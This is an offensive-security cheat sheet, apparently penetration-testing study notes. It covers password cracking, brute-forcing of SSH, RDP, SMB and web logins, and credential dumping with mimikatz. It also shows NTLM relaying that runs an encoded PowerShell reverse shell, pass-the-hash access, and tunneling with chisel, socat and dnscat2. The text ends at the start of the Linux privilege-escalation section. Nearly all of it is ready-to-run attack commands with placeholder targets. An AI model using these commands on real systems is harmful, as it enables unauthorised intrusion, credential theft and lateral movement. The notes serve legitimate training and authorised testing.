# System Attacks

## Index

- [Password Attacks](#password-attacks)
  - [Wordlists](#wordlists)
  - [Password Decrypts](#password-decrypts)
  - [Password Cracking](#password-cracking)
  - [John the Ripper](#john-the-ripper)
  - [Hashcat](#hashcat)
  - [Ophcrack](#ophcrack)
  - [Password Manager: KeePass](#password-manager-keepass)
  - [SSH Private Key Passphrase](#ssh-private-key-passphrase)
  - [Network Service Attack](#network-service-attack)
  - [Metasploit](#metasploit)
  - [Medusa, HTTP htaccess Attack](#medusa-http-htaccess-attack)
  - [Crowbar, Remote Desktop Protocol Attack](#crowbar-remote-desktop-protocol-attack)
  - [THC Hydra](#thc-hydra)
  - [Password protected files](#password-protected-files)
  - [Custom wordlists](#custom-wordlists)
  - [More attacks](#more-attacks)
  - [Leveraging Password Hashes](#leveraging-password-hashes)
  - [Identify hashes](#identify-hashes)
  - [mimikatz](#mimikatz)
  - [Cracking NTLM](#cracking-ntlm)
  - [Cracking Net-NTLMv2 (or NTLMv2)](#cracking-net-ntlmv2-or-ntlmv2)
  - [Pass-the-Hash](#pass-the-hash)
- [Port Redirection and Tunneling](#port-redirection-and-tunneling)
  - [Port Forwarding](#port-forwarding)
    - [rinetd](#rinetd)
    - [Socat](#socat)
  - [SSH Tunneling](#ssh-tunneling)
    - [SSH Local Port Forwarding](#ssh-local-port-forwarding)
    - [SSH Dynamic Port Forwarding](#ssh-dynamic-port-forwarding)
    - [SSH Remote Port Forwarding](#ssh-remote-port-forwarding)
    - [SSH Remote Dynamic Port Forwarding](#ssh-remote-dynamic-port-forwarding)
    - [Sshuttle](#sshuttle)
  - [ssh.exe](#sshexe)
  - [Plink.exe](#plinkexe)
  - [Netsh](#netsh)
    - [Local port forwarding](#local-port-forwarding)
    - [allow inbound traffic on TCP port 4455](#allow-inbound-traffic-on-tcp-port-4455)
  - [Chisel](#chisel)
  - [DNS Tunneling](#dns-tunneling)
    - [Dnsmasq to setup a DNS resolver](#dnsmasq-to-setup-a-dns-resolver)
    - [dnscat2](#dnscat2)
  - [Metasploit Portfwd](#metasploit-portfwd)
- [Linux Privilege Escalation](#linux-privilege-escalation)
  - [Resources](#resources)
  - [Strategy](#strategy)
  - [Information gathering](#information-gathering)
  - [Reverse Shell](#reverse-shell)
  - [Service Exploits](#service-exploits)
  - [Weak File Permissions](#weak-file-permissions)
  - [Exposed Confidential Information](#exposed-confidential-information)
  - [SSH](#ssh)
  - [Sudo](#sudo)
  - [Cron Jobs](#cron-jobs)
  - [SUID / SGID Executables](#suid--sgid-executables)
  - [Passwords & Keys](#passwords--keys)
  - [Kernel Exploits](#kernel-exploits)
  - [CVE](#cve)
  - [find with exec](#find-with-exec)
  - [find PE](#find-pe)
  - [Abusing capabilities](#abusing-capabilities)
  - [Escape shell](#escape-shell)
  - [Docker](#docker)
  - [User groups](#user-groups)
  - [fail2ban](#fail2ban)
  - [Postfix](#postfix)
- [Windows Privilege Escalation](#windows-privilege-escalation)
  - [Checklist](#checklist)
  - [Resources](#resources-1)
  - [Strategy](#strategy-1)
  - [Information gathering](#information-gathering-1)
  - [Privileges](#privileges)
  - [Privileged Groups](#privileged-groups)
    - [DnsAdmins](#dnsadmins)
    - [gMSA](#gmsa)
    - [AD Recycle Bin](#ad-recycle-bin)
  - [Add new admin user](#add-new-admin-user)
  - [Log in with another user from the same machine](#log-in-with-another-user-from-the-same-machine)
  - [Generate a reverse shell](#generate-a-reverse-shell)
  - [Kernel Exploits](#kernel-exploits)
  - [Driver Exploits](#driver-exploits)
  - [Service Exploits](#service-exploits)
  - [CVEs](#cves)
  - [User Account Control (UAC)](#user-account-control-uac)
  - [Insecure File Permissions](#insecure-file-permissions)
  - [Registry](#registry)
  - [Passwords](#passwords)
  - [Scheduled Tasks](#scheduled-tasks)
  - [Insecure GUI Apps](#insecure-gui-apps)
  - [Startup Apps](#startup-apps)
  - [Installed Applications](#installed-applications)
  - [Hot Potato](#hot-potato)
  - [Token Impersonation](#token-impersonation)
  - [getsystem](#getsystem)
  - [Pass The Hash](#pass-the-hash)
  - [Pass The Password](#pass-the-password)
  - [Apache lateral movement](#apache-lateral-movement)
  - [Read data stream](#read-data-stream)
  - [PrintNightmare](#printnightmare)
  - [Bypass CLM / CLM breakout | CLM / AppLocker Break Out](#bypass-clm--clm-breakout--clm--applocker-break-out)
  - [From Local Admin to System](#from-local-admin-to-system)
  - [TeamViewer](#teamviewer)
  - [Exploiting service through Symbolic Links](#exploiting-service-through-symbolic-links)
  - [Write privileges](#write-privileges)
  - [Services running - Autorun](#services-running---autorun)
  - [CEF Debugging Background](#cef-debugging-background)
  - [Feature Abuse](#feature-abuse)
    - [Jenkins](#jenkins)
- [Buffer Overflow](#buffer-overflow)
  - [Spiking](#spiking)
  - [Fuzzing](#fuzzing)
  - [Finding the Offset](#finding-the-offset)
  - [Overwriting the EIP](#overwriting-the-eip)
  - [Finding bad characters](#finding-bad-characters)
  - [Finding the right module](#finding-the-right-module)
  - [Generating Shellcode](#generating-shellcode)
- [Antivirus Evasion](#antivirus-evasion)
  - [ToDo](#todo)
  - [With Evil-WinRM](#with-evil-winrm)
  - [Thread Injection](#thread-injection)
  - [Shellter](#shellter)

## Password Attacks

[How Secure Is My Password?](https://howsecureismypassword.net/)

### Wordlists
- [SecLists](https://github.com/danielmiessler/SecLists)
- [wordlists.assetnote.io](https://wordlists.assetnote.io/)
- [content_discovery_all.txt](https://gist.github.com/jhaddix/b80ea67d85c13206125806f0828f4d10)
- [OneListForAll](https://github.com/six2dez/OneListForAll)
- [wordlistgen](https://github.com/ameenmaali/wordlistgen)
- [Scavenger](https://github.com/0xDexter0us/Scavenger)
- [cewl](https://digi.ninja/projects/cewl.php)
  - `cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt`
- Wordlists in kali
  - /usr/share/wordlists/seclists/Passwords/months.txt
  - /usr/share/wordlists/seclists/Passwords/seasons.txt
  - /usr/share/wordlists/metasploit/unix_passwords.txt
  - /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
  - /usr/share/wordlists/rockyou.txt

**Brute Force Wordlists**

[Crunch](https://sourceforge.net/projects/crunch-wordlist/), see [crunch | Kali Linux Tools](https://www.kali.org/tools/crunch/). 

| Placeholder |  Character translation             |
| ----------- | ---------------------------------- |
| @           | Lower case alpha characters        |
| ,           | Upper case alpha characters        |
| %           | Numeric characters                 |
| ^           | Special characters including space |

Examples of usage:
- Structure of the passwords of the target: `[Capital Letter] [2 x lower case letters] [2 x special chars] [3 x numeric]`. Run `crunch 8 8 -t ,@@^^%%%`
- Passwords between four and six characters in length, containing only the characters 0-9 and A-F: `crunch 4 6 0123456789ABCDEF -o crunch.txt`
- Use a pre-defined character-set with `-f` and include `mixalpha` to  include all lower and upper case letters `crunch 4 6 -f /usr/share/crunch/charset.lst mixalpha -o crunch.txt`

**Mutating wordlists**

When password policies are implemented, it is helpful to remove password policies that are guaranteed to fail from the worlist. Starting from a wordlist called `demo.txt`
- `sed -i '/^1/d' demo.txt` remove all number sequences

Many people just append a "1" to the end of an existing password when creating a password with a number value. Create a rule file with $1 that adds a "1" to each password in our wordlist.
- Add a rule for hashcat with `echo \$1 > demo.rule`

Many people have a tendency to capitalize the initial character in a password when they are required to use an upper case character.
- Add a rule with `echo '$1\nc' > demo.rule`
  - Note: each line in the file is interpreted as a new rule

For special characters:
- `$1 c $!` to have `Password1!`
- `$! $1 c` to have `Password!1`

Other rules
- Test the rules with `hashcat -r demo.rule --stdout demo.txt`
- `/usr/share/hashcat/rules` in Kali
- See: [rule_based_attack [hashcat wiki]](https://hashcat.net/wiki/doku.php?id=rule_based_attack)

### Password Decrypts
- https://github.com/frizb/PasswordDecrypts
- ```
  "Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
  msf5 > irb
  key="\x17\x52\x6b\x06\x23\x4e\x58\x07"
  require 'rex/proto/rfb'
  Rex::Proto::RFB::Cipher.decrypt ["6BCF2A4B6E5ACA0F"].pack('H*'), key
  ```
- `aes_decrypt.py`
  - you need the key + iv to decrypt an encoded base64

### Password Cracking

**Tools**
- [John the Ripper](https://www.openwall.com/john/)
- [Hashcat](https://hashcat.net/hashcat/)
- [Ophcrack](https://ophcrack.sourceforge.io/)

### John the Ripper
- `john --format=Raw-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt user.hash`
- Note for Linux-based systems: first use the unshadow utility to combine the passwd and shadow files from the compromised system `unshadow passwd-file.txt shadow-file.txt > unshadowed.txt`
- `john -incremental -users:<user list> <file to crack>` pure brute force attack, you can use `-user:<username>` to target a specific user
- `john --show crackme` display the passwords recovered
- `john --wordlist=<custom wordlist file> -rules <file to crack>` dictionary attack, use `-wordlist` instead of `--wordlist=<custom wordlist file>` to use the john default wordlist
- `john hash.txt --format=NT` simple attack to attack NT hashes
- `john --rules --wordlist=<custom wordlist file> hash.txt --format=NT` using password mutation rules
- `john --rules --wordlist=<custom wordlist file> unshadowed.txt`
- To distribute the load and speed up the cracking process (for multi core CPUs)
  1. Use the options `--fork=8` and `--node=1-8/16` on the first machine
  2. Use the options `--fork=8` and `--node=9-16/16` on the first machine

### Hashcat

- `hashcat --help | grep -i "sha-256"`
- `hashcat -m 1000 user.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
- `hashcat -m 24200 user.hash /usr/share/wordlists/rockyou.txt --force`
- `hashcat -m 10900 'pbkdf2_sha256$216000$8Dawv0l1PGBR$n/Jnp5J0RM++B/vjWFp3R/jRzFaxGLxK9KGgwTuvX3M=' /usr/share/wordlists/rockyou.txt --force`
- https://systemweakness.com/cracking-user-passwords-stored-in-keycloak-with-hashcat-d56522cc2dc


### Ophcrack

1. Install the tables
2. Load a password file with `Load`
3. Click on the `Crack` button

### Password Manager: KeePass
- `Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue` search for KeePass database files
- `keepass2john Database.kdbx > keepass.hash` format KeePass database for Hashcat with keepass2john
  - remove `Database:` from `keepass.hash`
- `hashcat -m 13400 keepass.hash wordlist.txt -r hashcat.rule --force` crack the KeePass database hash
  - find the mode of KeePass in Hashcat with `hashcat --help | grep -i "KeePass"`


### SSH Private Key Passphrase

- Prerequisites: found username, old passwords (or common passwords), password policy and private key `id_rsa`
  - `chmod 600 id_rsa` to change the permissions
  - `id_rsa` needs a password
1. `ssh2john id_rsa > ssh.hash` > remove `id_rsa:`
2. For JtR, create a file for the rules in the file `ssh.rule` using the found password policy
   - add `[List.Rules:sshRules]` as the first line of the file
   - add the rules to JtR config `sudo sh -c 'cat /home/kali/Downloads/ssh.rule >> /etc/john/john.conf'`
3. `john --wordlist=ssh.passwords --rules=sshRules ssh.hash`
4. Connect to the ssh service with `ssh -i id_rsa -p <PORT> <user>@<IP>` and insert the found password

### Network Service Attack

**Tools**
- [Metasploit](https://www.metasploit.com/)
- [Medusa](http://h.foofus.net/?page_id=51)
- [Spray](https://github.com/Greenwolf/Spray)
- [Crowbar](https://github.com/galkan/crowbar)
- [THC Hydra](https://github.com/vanhauser-thc/thc-hydra)

### Metasploit

- SSH Brute force: `scanner/ssh/ssh_login`

### Medusa, HTTP htaccess Attack

- `medusa -d` All the protocols medusa can interact with
- ` medusa -h <IP> -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin`
  - `-m` htaccess-protected URL
  - `-h` target host
  - `-u` attack the admin user
  - `-P` wordlist file
  - `-M` HTTP authentication scheme

### Crowbar, Remote Desktop Protocol Attack

- `crowbar --help`
- `crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-file.txt -n 1`
  - `-b` specify the protocol
  - `-s` target server
  - `-u` username
  - `-c` wordlist
  - `-n` number of threads

### THC Hydra

- `sudo hydra`
- `sudo hydra -L users.txt -P pass.txt <service://server> <options>` launch a dictionary attack
  - `hydra -L users.txt -P pass.txt telnet://target.server` Telnet example
  - `hydra -L users.txt -P pass.txt http-get://target.server` Password protected web resource
  - Specify a port with `-s <PORT>` in <options>
- `hydra -L usernames.txt -P passwords.txt 192.168.244.140 smtp -e nsr`
- `hydra -L usernames.txt -P usernames.txt 192.168.182.216 ssh -e nsr`
- `sudo hydra -L usernames.txt -P passwords.txt 192.168.157.21 smb2 -e nsr`
- `hydra -I -f -L custom-wordlist.txt -P custom-wordlist.txt 'http-post-form://192.168.190.208:7080/login.php/session:userid=^USER64^&pass=^PASS64^:C=/:F=403' -e nsr`

SSH Attack
- `sudo hydra -l <user> -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1`
  - `-l` specify the target username
  - `-P` specify a wordlist
  - `protocol://IP` o specify the target protocol and IP address respectively

HTTP POST Attack
- `sudo hydra http-form-post -U`
- `sudo hydra -l user -P /usr/share/wordlists/rockyou.txt <IP> http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"`
  - `-l` user name
  - `-P` wordlist
  - `-vV` verbose output
  - `-f` stop the attack when the first successful result is found
  - supply the service module name `http-form-post` and its required arguments `/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN`

### Password protected files
- dfcrack -f Infrastructure.pdf -w /usr/share/wordlists/rockyou.txt
- rar2john backup.rar > crackme
  - john --wordlist=/usr/share/wordlists/rockyou.txt crackme
  - same for zip2john
- ssh2john id_rsa > ssh.hash
  john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
- office2john RSA-Secured-Document-PII.docx > hash.txt
  john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
- keepass2john jeeves.kdbx > jeeves.hash
  john jeeves.hash
- fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt backup1.zip

### Custom wordlists
- Cewl
  - (at first, use just this list) `cewl http://192.168.134.126/ --with-numbers -w custom-wordlist.txt`
  - `cewl -d 5 -m 3 http://192.168.220.115/ -w custom-wordlist.txt`
  - `cewl --lowercase http://192.168.13444.126/ | grep -v CeWL >> custom-wordlist.txt`
  - `sort custom-wordlist.txt | uniq -u > final-wordlist.txt`
- generate usernames
  - `python2 ~/Documents/scripts/usernamer.py -f full_names.txt`
- `cupp -i`

### More attacks
- `crackmapexec ssh 192.168.220.240 -u usernames.txt -p passwords.txt --continue-on-success`
- AES-256-CBC-PKCS7: https://github.com/mpgn/Padding-oracle-attack
  - `python3 exploit.py -c 4358b2f77165b5130e323f067ab6c8a92312420765204ce350b1fbb826c59488 -l 16 --host 192.168.229.119:2290 -u '/?c=' --error '<span id="MyLabel">0</span>'`

### Leveraging Password Hashes

**Tools**
- [Sample password hash encoding strings](https://openwall.info/wiki/john/sample-hashes)
- [hashID](https://psypanda.github.io/hashID/)
- [hash-identifier](https://www.kali.org/tools/hash-identifier/)
- [mimikatz](https://blog.3or.de/mimikatz-deep-dive-on-lsadumplsa-patch-and-inject.html)
- [fgdump](http://foofus.net/goons/fizzgig/fgdump/downloads.htm)
- [Credential Editor](https://www.ampliasecurity.com/research/windows-credentials-editor/)
- [pth-winexe](https://github.com/byt3bl33d3r/pth-toolkit)
- [Responder.py](https://github.com/SpiderLabs/Responder)

**Notes**
- On most Linux systems, hashed passwords are stored in the `/etc/shadow` file
- On Windows systems, hashed user passwords are stored in the Security Accounts Manager (SAM). Microsoft introduced the SYSKEY feature (Windows NT 4.0 SP3) to deter offline SAM database password attacks
- Windows NT-based systems, up to and including Windows 2003, store two different password hashes: LAN Manager (LM) (DES based) and NT LAN Manager (NTLM), wich uses MD4 hashing
- From Windows Vista on, the operating system disables LM by default and uses NTLM
- In Windows, get all local users in PowerShell with `Get-LocalUser`

### Identify hashes
- [hash-identifier](https://www.kali.org/tools/hash-identifier/)
- [hashid](https://www.kali.org/tools/hashid/)
  - `hashid <HASH>`
- [Hash Analyzer - TunnelsUP](https://www.tunnelsup.com/hash-analyzer/)

### mimikatz
1. `C:\Programs\mimikatz.exe`
2. `privilege::debug` enables the SeDebugPrivilge access right required to tamper with another process
3. `token::elevate` elevate the security token from high integrity (administrator) to SYSTEM integrity
4. `lsadump::sam` dump the contents of the SAM database

### Cracking NTLM
1. Identify the local users with `Get-LocalUser`
2. Run `mimikatz.exe` as an administrator
3. Use the command `privilege::debug` to have `SeDebugPrivilege` access right enabled
4. Use the command `token::elevate` to elevate to SYSTEM user privileges
5. Extract passwords from the system
   - `sekurlsa::logonpasswords` attempts to extract plaintext passwords and password hashes from all available sources
   - `lsadump::sam` extracts the NTLM hashes from the SAM
6. Run `hashcat --help | grep -i "ntlm"` to retrieve the correct hash mode
7. `hashcat -m 1000 user.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`

### Cracking Net-NTLMv2 (or NTLMv2)

Capture a Net-NTLMv2 hash
1. `ip a` retrieve a list of all interfaces
2. `sudo responder -I <interface>`
3. Wait for a connection, capture the hash and save it as `user.hash`

Crack the Net-NTLMv2 hash
1. `hashcat --help | grep -i "ntlm"`
2. `hashcat -m 5600 user.hash /usr/share/wordlists/rockyou.txt --force`

Relaying Net-NTLMv2
1. Instead of printing a retrieved Net-NTLMv2 hash, we'll forward it to `<IP>` that it's the target machine
2. `sudo impacket-ntlmrelayx --no-http-server -smb2support -t <IP> -c "powershell -enc <BASE64>"`
   - use it to execute a reverse shell on your machine on port `<PORT>` and run a listener `nc -nvlp <PORT>`
   - see how to encode one-liner in base64 [here](#microsoft-office)
3. Now, if a user tries to connect to our machine with `dir \\<ATTACKER-IP>\test`, it will forward the request to `<IP>` and execute the command specified in the flag `-c`


### Pass-the-Hash

Note: this attack works for `Administrator` user (except for certain conditions). Since Windows Vista, all Windows versions have [UAC remote restrictions](https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/user-account-control-and-remote-restriction) enabled by default.
- From Mimikatz, run `privilege::debug`, `token::elevate` and `lsadump::sam` to obtain the NTLM hash of Administrator
- Gain access to a SMB share with `smbclient \\\\<IP>\\<SMB-SHARE> -U Administrator --pw-nt-hash <Administrator-HASH>`
- Gain an interactive shell with `impacket-psexec -hashes <LMHash>:<NTHash> <username>@<ip> <command>`
  - This will always give a shell as `SYSTEM`, use `impacket-wmiexec` to obtain a shell as the user used for authentication
  - `<command>` is optional. If left blank, cmd.exe will be executed
  - See also: [impacket-scripts](https://www.kali.org/tools/impacket-scripts/) 

Other notes:
- ["Pass the Hash Attack"](https://www.netwrix.com/pass_the_hash_attack_explained.html)
- ["PsExec Explainer by Mark Russinovich"](https://www.itprotoday.com/windows-server/psexec-explainer-mark-russinovich)
- [pth-winexe](https://github.com/byt3bl33d3r/pth-toolkit)
  - `pth-winexe -U <domain/username>%<hash> //<targetIP> cmd.exe`
  - `-U` specifying the username and hash, along with the SMB share and the name of the command to execute
  

## Port Redirection and Tunneling

**Tools and notes**
- [rinetd](https://github.com/samhocevar/rinetd)
- [ProxyChains](https://github.com/haad/proxychains)
- [Plink.exe](https://the.earth.li/~sgtatham/putty/0.53b/htmldoc/Chapter7.html)
- [HTTPTunnel](https://github.com/larsbrinkhoff/httptunnel)
- [PWK Notes: Tunneling and Pivoting](https://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.html)

### Port Forwarding

#### rinetd

1. Edit `/etc/rinetd.conf`, add `0.0.0.0 <Local-PORT> <IP> <DEST-PORT>`
   - This means that all traffic received on port `<Local-PORT>` of our machine, listening on all interfaces (`0.0.0.0`), regardless of destination address, will be forwarded to `<IP>:<DEST-PORT>`. 
2. Restart rinetd `sudo service rinetd restart` and confirm that the port is bound with `ss -antp | grep "80"`


#### Socat

- `socat -ddd TCP-LISTEN:<PORT>,fork TCP:<DEST-IP>:<DEST-PORT>`
  - The traffic received on port `<PORT>` will be forwarded to `<DEST-IP>:<DEST-PORT>`
- Example with SSH `socat TCP-LISTEN:2222,fork TCP:<IP>:22`
- Example with psql -h 192.168.50.63 -p 2345 -U postgres `socat -ddd TCP-LISTEN:2345,fork TCP:<IP>:5432`


### SSH Tunneling

See: ["SSH Tunneling: Examples, Command, Server Config"](https://www.ssh.com/academy/ssh/tunneling-example)

#### SSH Local Port Forwarding
	
- Give a reverse shell [TTY](https://en.wikipedia.org/wiki/TTY) functionality with Python3's pty: `python3 -c 'import pty; pty.spawn("/bin/bash")'`
- `ssh -R <local-port>:127.0.0.1:<target-port> <username>@<local-machine>`
- `ssh -N -L <bind_address>:<port>:<host>:<hostport> <username>@<address>`
  - Listen on all interfaces (`<bind_address>` = `0.0.0.0`) on port `<port>`, then forward all packets through the SSH tunnel (`<username>@<address>`) to port `<hostport>` on the host `<host>`
  - Verify it with `ss -ntplu`

#### SSH Dynamic Port Forwarding
1. From the reverse shell, run `ssh -N -D <address to bind to>:<port to bind to> <username>@<SSH server address>`
2. Now we must direct our tools to use this proxy with ProxyChains
   - Edit the ProxyChains configuration file `/etc/proxychains.conf`, add the SOCKS5 proxy `socks5  <IP-reverse-shell> <port to bind to>`
3. To run the tools through the SOCKS5 proxy, prepend each command with ProxyChains
   - Example with nmap: `sudo proxychains nmap -vvv -sT --top-ports=20 -Pn <IP>`
   - Example with SMB: `proxychains smbclient -L //<IP>/ -U <username> --password=<password>`

#### SSH Remote Port Forwarding
1. Start ssh on your local machine
2. On the reverse shell: `ssh -N -R [bind_address]:port:host:hostport [username@address]`
   - Set `[bind_address]` as `127.0.0.1`
   - `[username@address]` of your local ssh


#### SSH Remote Dynamic Port Forwarding
1. On the reverse shell, run `python3 -c 'import pty; pty.spawn("/bin/bash")'` and `ssh -N -R <PORT> [username@address]`
   - `[username@address]` of your local ssh
2. Edit the ProxyChains configuration file `/etc/proxychains.conf`, add the SOCKS5 proxy `socks5  127.0.0.1 <PORT>`
3. To run the tools through the SOCKS5 proxy, prepend each command with ProxyChains


#### Sshuttle
1. Note: it requires root privileges on the SSH client and Python3 on the SSH server
2. From the reverse shell, run `socat TCP-LISTEN:2222,fork TCP:<forward-IP>:<forward-PORT>`
3. `sshuttle -r <ssh-connection-string> <subnet> ...`
   - Specify the SSH connection string we want to use `<ssh-connection-string>` and the subnets that we want to tunnel through this connection (ex. `10.74.23.0/24 172.16.163.0/24`)


### ssh.exe
1. Start SSH server on Kali `sudo systemctl start ssh`
2. Connect to the Windows machine. Note: OpenSSH bundled with Windows has to be higher than `7.6` for remote dynamic port forwarding
3. `ssh -N -R <PORT> <kali>@<IP>`
4. Edit the ProxyChains configuration file `/etc/proxychains.conf`, add the SOCKS5 proxy to it (`socks5  127.0.0.1 <PORT>`).
5. To run the tools through the SOCKS5 proxy, prepend each command with ProxyChains

### Plink.exe

The general format is: `plink.exe <user>@<kali-IP> -R <kaliport>:<target-IP>:<target-port>`

The first time plink connects to a host, it will attempt to cache the host key in the registry. For this reason, we should pipe the answer to the prompt with the `cmd.exe /c echo y` command. The final result will look like `cmd.exe /c echo y | plink.exe <user>@<kali> -R <kaliport>:<target-IP>:<target-port>`.

### Netsh

#### Local port forwarding
`netsh interface portproxy add v4tov4 listenport=<PORT> listenaddress=<IP> connectport=<forward-PORT> connectaddress=<forward-IP>`
- use netsh (`interface`) context to `add` an IPv4-to-IPv4 (`v4tov4`) proxy (`portproxy`)
- listening on `<target-IP>` (`listenaddress=target-IP`), port `<target-port>` (`listenport=<target-port>`)
- that will forward to `<forward-IP>` (`connectaddress=<forward-IP>`), port `<forward-port>` (`connectport=<forward-port>`)

#### allow inbound traffic on TCP port 4455
`netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=<IP> localport=<port> action=allow`


### Chisel

- https://0xdf.gitlab.io/2019/06/01/htb-sizzle.html
- https://ap3x.github.io/posts/pivoting-with-chisel/
- https://exploit-notes.hdks.org/exploit/network/port-forwarding/port-forwarding-with-chisel/
- https://notes.benheater.com/books/network-pivoting/page/port-forwarding-with-chisel
- To have the process in the background, use `&` at the end of the command

**Port forwarding with chisel**: https://exploit-notes.hdks.org/exploit/network/port-forwarding/port-forwarding-with-chisel/
```
./chisel server -p 9999 --reverse
./chisel client 192.168.45.193:9999 R:8000:socks                <# dynamic port forwarding #>
./chisel.exe client 192.168.45.193:9999 R:8090:localhost:80     <# port forwarding port 80 
                                                                     connect then to localhost:8090 
                                                                     usefull for /phpmyadmin/ #>
```

**Proxy**
1. on the attacker machine: `chisel server -p LISTEN_PORT --reverse`
2. on the remote machine: `.\chisel.exe client ATTACKING_IP:LOCAL_OPEN_PORT R:LISTEN_PORT:socks`

**Reverse SOCKS Proxy**
1. On the attacker machine: `chisel server -p LISTEN_PORT --reverse`
2. On the remote machine: `./chisel client ATTACKING_IP:LISTEN_PORT R:socks`
3. `sudo nano /etc/proxychains.conf`
   comment everything under `[ProxyList]` and add a new line `socks5 127.0.0.1 LISTEN_PORT`
   + you can also add FoxyProxy > `socks5 127.0.0.1 4242`

**Forward SOCKS Proxy**
1. On the remote machine: `./chisel server -p LISTEN_PORT --socks5`
2. On the attacker machine: `chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks`

**Remote Port Forward**
1. On the attacker machine: `./chisel server -p LISTEN_PORT --reverse`
2. On the remote machine: `./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT`

**Local port forwarding**
1. On the remote machine: `chisel server -p LISTEN_PORT`
2. On the attacker machine: `.\chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT`

**HTTP Tunneling**
1. The machines are `KALI01`, `DMZ01` and `INTERNAL01`
   - `KALI01` will listen on TCP port `1080`, a SOCKS proxy port
2. In `KALI01`, copy the [Chisel](https://www.kali.org/tools/chisel/) binary to the Apache2 server folder `sudo cp $(which chisel) /var/www/html/` and start Apache2 `sudo systemctl start apache2`
3. Deliver the Chisel executable to the `DMZ`
4. On `KALI01`, run Chisel `chisel server --port 8080 --reverse` and run `sudo tcpdump -nvvvXi <INTERFACE> tcp port 8080`
   - `ip a` retrieve the list of all interfaces
5. On `DMZ01`, run the Chisel client command`/tmp/chisel client <KALI01-IP>:8080 R:socks > /dev/null 2>&1 &`
6. Now, you should be able to see inbound Chisel traffic and an incoming connection in the Chisel server
7. Check if the SOCKS port has been opened by the `KALI01` Chisel server with `ss -ntplu`
8. How to use the HTTP Tunnel
   - SSH with Ncat: Pass an Ncat command to ProxyCommand to use the socks5 protocol and the proxy socket at `127.0.0.1:1080` to connect to `INTERNAL01`
     - `ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' <username>@<IP>`
     - `%h` and `%p` tokens represent the SSH command host and port values
   - Another option is to use ProxyChains by adding `socks5 127.0.0.1 1080` to `/etc/proxychains.conf` and prepending `sudo proxychains` to each command we want to run


### DNS Tunneling

#### Dnsmasq to setup a DNS resolver
1. Setup: `WAN`, `DMZ` and `INTERNAL`
2. From a machine inside `WAN`, setup a DNS server by using a software like [Dnsmasq](https://thekelleys.org.uk/dnsmasq/doc.html)
   - `sudo dnsmasq -C dnsmasq.conf -d`. An example of configuration (see also [dnsmasq.conf.example](https://github.com/PowerDNS/dnsmasq/blob/master/dnsmasq.conf.example)):
     ```
     # Do not read /etc/resolv.conf or /etc/hosts
     no-resolv
     no-hosts

     # Define the zone
     auth-zone=organization.corp
     auth-server=organization.corp

     # TXT record
     txt-record=www.organization.corp,some info.
     txt-record=www.organization.corp,some other info.
     ```
   - `sudo tcpdump -i ens192 udp port 53`

#### [dnscat2](https://github.com/iagox86/dnscat2)
1. Setup: `WAN`, `DMZ` and `INTERNAL`
2. Start `dnscat2-server organization.corp` from `WAN` and connect from `INTERNAL` to it with `./dnscat feline.corp`
3. From `dnscat2-server` > `window -i 1` > `listen 127.0.0.1:<lister-PORT> <IP>:<PORT>`
   - `<IP>:<PORT>` = machine from `INTERNAL` 

### Metasploit Portfwd
- [Metasploit Unleashed - Portfwd](https://www.offsec.com/metasploit-unleashed/portfwd/)


## Linux Privilege Escalation

### Resources
- [TryHackMe | Linux PrivEsc](https://tryhackme.com/room/linuxprivesc)
- [Linux Privilege Escalation for OSCP & Beyond! | Udemy](https://www.udemy.com/course/linux-privilege-escalation/)
- ["Understanding and Using File Permissions | Ubuntu"](https://help.ubuntu.com/community/FilePermissions)
- ["File permissions and attributes | Arch Linux"](https://wiki.archlinux.org/title/File_permissions_and_attributes)
- [Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- Tools
  - [Linux Exploit Suggester 2](https://github.com/jondonas/linux-exploit-suggester-2)
  - [LinPEAS - Linux Privilege Escalation Awesome Script](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
      - [Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
  - [Unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)
    - `./unix-privesc-check standard > output.txt`
  - [linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
  - [LinEnum](https://github.com/rebootuser/LinEnum)
  - [Reverse Shell Generator - rsg](https://github.com/mthbernardes/rsg)

### Strategy
1. Check your user with `id` and `whoami`
2. Run [linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration) with increasing levels
   - starting from lvl `0` to `2`, `./lse.sh -l 0`
3. Run other scripts like `lse_cve.sh`
4. Check for default / weak credentials
   - example: `username:username`, `root:root`
5. Check the directory `opt/` for possible apps to exploit
6. If the scripts fail, run the commands in this section and see [Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)


### Information gathering
```bash
# enumerate users
cat /etc/passwd

# enumerate the Hostname
hostname

# enumerate the Operating System Version and Architecture
cat /etc/issue
cat /etc/*-release
cat /etc/os-release
uname -a
uname -r
arch

# enumerate running processes and services
ps axu

# enumerate networking information
ip a
/sbin/route
routel
ss -anp

# inspect custom IP tables
cat /etc/iptables/rules.v4

# enumerate scheduled tasks
ls -lah /etc/cron*
cat /etc/crontab
